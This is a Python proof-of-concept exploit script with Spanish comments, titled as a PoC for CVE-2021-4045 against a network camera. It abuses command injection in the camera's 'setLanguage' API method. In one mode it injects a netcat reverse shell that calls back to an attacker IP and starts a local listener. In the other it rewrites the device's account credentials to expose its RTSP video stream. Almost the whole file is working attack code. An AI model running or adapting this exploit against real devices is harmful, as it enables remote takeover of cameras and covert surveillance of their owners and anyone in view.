import requests
import urllib3
import sys
import threading
import os
import hashlib

# Desactiva las advertencias de solicitud HTTP insegura
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Puerto para la conexión inversa
REVERSE_SHELL_PORT = 443

# Comando de shell inversa a ejecutar
REVERSE_SHELL_COMMAND = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'

# Comando NC (Netcat) para escuchar en el puerto especificado
NC_COMMAND = 'nc -lv %d' % REVERSE_SHELL_PORT

# Credenciales RTSP
RTSP_USER = 'pwned1337'
RTSP_PASSWORD = 'pwned1337'
RTSP_CIPHERTEXT = 'RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k='

def escuchar_nc():
    # Inicia un hilo para escuchar en el puerto especificado
    print("[+] Escuchando en el puerto %d..." % REVERSE_SHELL_PORT)
    os.system(NC_COMMAND)

def enviar_shell_inversa(victim_ip, attacker_ip):
    # Envía una shell inversa a la víctima
    print("[+] Enviando shell inversa a %s...\n" % victim_ip)
    payload_shell_inversa = {"method": "setLanguage", "params": {"payload": "';" + REVERSE_SHELL_COMMAND % (attacker_ip, REVERSE_SHELL_PORT) + ";'"}}
    requests.post(url_victima, json=payload_shell_inversa, verify=False)

def configurar_rtsp(victim_ip):
    # Configura un flujo de video RTSP y cambia las credenciales en la víctima
    print("[+] Configurando flujo de video RTSP...")
    md5_password = hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
    payload_rtsp = {"method": "setLanguage", "params": {"payload": "';uci set user_management.third_account.username=%s;uci set user_management.third_account.passwd=%s;uci set user_management.third_account.ciphertext=%s;uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;'" % (RTSP_USER, md5_password, RTSP_CIPHERTEXT)}}
    requests.post(url_victima, json=payload_rtsp, verify=False)

def main():
    print("""
    CVE-2021-4045 PoC  _   @hacefresko                 
     _ ____      ___ __ | |_ __ _ _ __   ___  
    | '_ \ \ /\ / / '_ \| __/ _` | '_ \ / _ \ 
    | |_) \ V  V /| | | | || (_| | |_) | (_) |
    | .__/ \_/\_/ |_| |_|\__\__,_| .__/ \___/ 
    |_|                          |_|          
    """)

    # Verifica los argumentos de línea de comandos
    if (len(sys.argv) < 4) or (sys.argv[1] not in ['shell', 'rtsp']):
        print("[x] Uso: python3 pwnTapo.py [shell|rtsp] [IP_victima] [IP_atacante]")
        return

    global url_victima
    url_victima = "https://" + sys.argv[2] + ":443/"
    modo_funcionamiento = sys.argv[1]

    if modo_funcionamiento == 'shell':
        # Inicia un hilo para escuchar en el puerto especificado
        t = threading.Thread(target=escuchar_nc)
        t.start()
        
        # Envía una shell inversa a la víctima
        enviar_shell_inversa(sys.argv[2], sys.argv[3])

    elif modo_funcionamiento == 'rtsp':
        # Configura un flujo de video RTSP y cambia las credenciales en la víctima
        configurar_rtsp(sys.argv[2])
        
        print("[+] Flujo de video RTSP disponible en rtsp://%s/stream2" % sys.argv[2])
        print("[+] RTSP username: %s" % RTSP_USER)
        print("[+] RTSP password: %s" % RTSP_PASSWORD)

if __name__ == "__main__":
    main()
